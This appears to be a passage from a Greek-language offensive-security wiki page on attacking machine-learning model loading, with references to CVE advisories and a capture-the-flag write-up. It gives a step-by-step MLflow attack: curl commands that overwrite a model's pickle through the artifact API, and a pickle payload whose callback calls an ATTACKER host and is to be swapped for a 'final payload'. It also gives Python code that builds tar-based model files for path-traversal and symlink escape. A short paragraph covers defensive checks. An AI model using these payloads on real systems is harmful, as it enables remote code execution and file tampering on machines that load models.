Ένα MLflow PyFunc που δημιουργείται από ένα `PythonModel` μπορεί να αποθηκεύσει το serialized object ως `python_model.pkl`. Τα metadata του μοντέλου ορίζουν το `mlflow.pyfunc.model` ως loader του, ενώ η υλοποίηση του MLflow χρησιμοποιεί αυτό το όνομα αρχείου για το αποθηκευμένο Python model. Κατά συνέπεια, η δυνατότητα εγγραφής στο artifact store μπορεί να οδηγήσει σε εκτέλεση κώδικα σε διαφορετική εφαρμογή που αργότερα φορτώνει το μοντέλο.<sup>[[17]](#references)[[18]](#references)</sup>

Η χρήσιμη αλυσίδα είναι **δικαίωμα εγγραφής artifact → αντικατάσταση του pickle → εξαναγκασμός ενός καταναλωτή inference να το φορτώσει ξανά**. Για ένα experiment που χρησιμοποιεί proxied ρίζα `mlflow-artifacts:/...`, απαριθμήστε το experiment, το run και τη διαδρομή artifact του μοντέλου. Ο tracking server παρέχει τα `GET` και `PUT` στο `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Ένας minimal reducer μπορεί να εκτελέσει μια εντολή μόλις ο consumer κάνει unpickle το artifact. Η δημιουργία του payload με την έκδοση Python που δηλώνεται στο `MLmodel` αποφεύγει προβλήματα συμβατότητας.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Ενεργοποιήστε τη λειτουργία που **φορτώνει το υπάρχον μοντέλο**, όπως πρόβλεψη, βαθμολόγηση ή ανάπτυξη. Μην κάνετε πρώτα επανεκπαίδευση, επειδή η εκπαίδευση μπορεί να αντικαταστήσει το κακόβουλο artifact με ένα νέο μοντέλο. Ένα σφάλμα της εφαρμογής δεν αποκλείει την εκμετάλλευση: ο reducer επιστρέφει τον ακέραιο κωδικό εξόδου της εντολής αντί για ένα αξιοποιήσιμο μοντέλο. Ξεκινήστε με μια παρατηρήσιμη παρενέργεια, όπως ένα callback μέσω ICMP ή HTTP, και έπειτα αντικαταστήστε το με το τελικό payload.<sup>[[20]](#references)</sup>

Κατά την αξιολόγηση, διακρίνετε το δικαίωμα δημιουργίας ενός run από το δικαίωμα αντικατάστασης artifacts που ανήκουν σε άλλο run. Ελέγξτε τον έλεγχο ταυτότητας και τα δικαιώματα ενημέρωσης ανά run, εξετάστε απρόσμενες τροποποιήσεις του `python_model.pkl` και αντιμετωπίστε την προέλευση και την ακεραιότητα των μοντέλων ως μέρος του ορίου εκτέλεσης. Ο τρέχων κώδικας του MLflow υποστηρίζει επίσης τη ρύθμιση του `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` και συνιστά artifacts models-from-code αντί για τη φόρτωση δεδομένων cloudpickle.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Εκτεθειμένοι servers μοντέλων και υποδομή ML

Η φόρτωση ενός κακόβουλου μοντέλου δεν είναι ο μόνος τρόπος εκτέλεσης κώδικα σε υποδομή ML. Τα API υποβολής εργασιών, τα endpoints επικύρωσης κώδικα και οι λήψεις από model registry υπηρεσιών AI με self-hosting μπορούν να οδηγήσουν σε εκτέλεση κώδικα χωρίς κανένα αρχείο μοντέλου. Δείτε [Εκτεθειμένες υπηρεσίες AI με self-hosting](AI-Exposed-Self-Hosted-AI-Services.md).

## Μοντέλα σε Path Traversal

Όπως αναφέρεται σε [**αυτήν την ανάρτηση ιστολογίου**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), οι περισσότερες μορφές μοντέλων που χρησιμοποιούνται από διάφορα AI frameworks βασίζονται σε αρχεία αρχειοθέτησης, συνήθως `.zip`. Επομένως, ίσως είναι δυνατό να γίνει κατάχρηση αυτών των μορφών για επιθέσεις Path Traversal, επιτρέποντας την ανάγνωση αυθαίρετων αρχείων από το σύστημα στο οποίο φορτώνεται το μοντέλο.<sup>[[16]](#references)</sup>

Για παράδειγμα, με τον παρακάτω κώδικα μπορείτε να δημιουργήσετε ένα μοντέλο που θα δημιουργήσει ένα αρχείο στον κατάλογο `/tmp` κατά τη φόρτωσή του:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Ή, με τον ακόλουθο κώδικα μπορείτε να δημιουργήσετε ένα μοντέλο που θα δημιουργεί ένα symlink προς τον κατάλογο `/tmp` κατά τη φόρτωσή του:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Εμβάθυνση: αποσειριοποίηση Keras .keras και αναζήτηση gadget

Για έναν εστιασμένο οδηγό σχετικά με τα εσωτερικά του .keras, το RCE μέσω Lambda-layer, το ζήτημα arbitrary import στις εκδόσεις ≤ 3.8 και την ανακάλυψη gadget μέσα στο allowlist μετά την επιδιόρθωση, δείτε:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Ιστολόγιο OffSec – "CVE-2024-12029 – Αποσειριοποίηση μη έμπιστων δεδομένων στο InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit επιδιόρθωσης InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Τεκμηρίωση module Metasploit της Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – ζητήματα ασφαλείας για το torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Ιστολόγιο ZDI – CVE-2025-23298: Απομακρυσμένη εκτέλεση κώδικα στο NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Συμβουλευτικό δελτίο ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit επιδιόρθωσης Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Ευάλωτος loader πριν από την επιδιόρθωση (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC κακόβουλου checkpoint (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader μετά την επιδιόρθωση (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Απομακρυσμένη εκτέλεση κώδικα με σύγχρονες μορφές και βιβλιοθήκες AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Τεκμηρίωση Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit block-list της Hydra (προειδοποίηση για RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Από SQLi σε RCE: Εκμετάλλευση του checkpointer του LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Μετατροπή σφαλμάτων Archive Slip σε πολύτιμες ευκαιρίες bounty για AI/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Συμβουλευτικό δελτίο Snyk και proof of concept PyFunc – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [Πηγαίος κώδικας MLflow – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [REST API του MLflow – endpoints λήψης και μεταφόρτωσης artifact](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
- [21] [Ταξινομία αποφυγής στατικού scanner MLTracer της Binarly](https://raw.githubusercontent.com/binarly-io/ai-supply-chain-attacks-research/master/MLTracer/evasion.md)
- [22] [Binarly – Εντοπισμός κακόβουλων μοντέλων με το MLTracer](https://binarly.io/blog/malicious-model-detection-mltracer)
- [23] [Υλοποίηση του PyTorch storage `_load_from_bytes`](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/storage.py)
- [24] [Αντιστοίχιση συμβατότητας `find_class` του pickle στο CPython](https://raw.githubusercontent.com/python/cpython/main/Lib/pickle.py)
- [25] [Αντιστοίχιση εισαγωγών `_compat_pickle` του CPython](https://raw.githubusercontent.com/python/cpython/main/Lib/_compat_pickle.py)
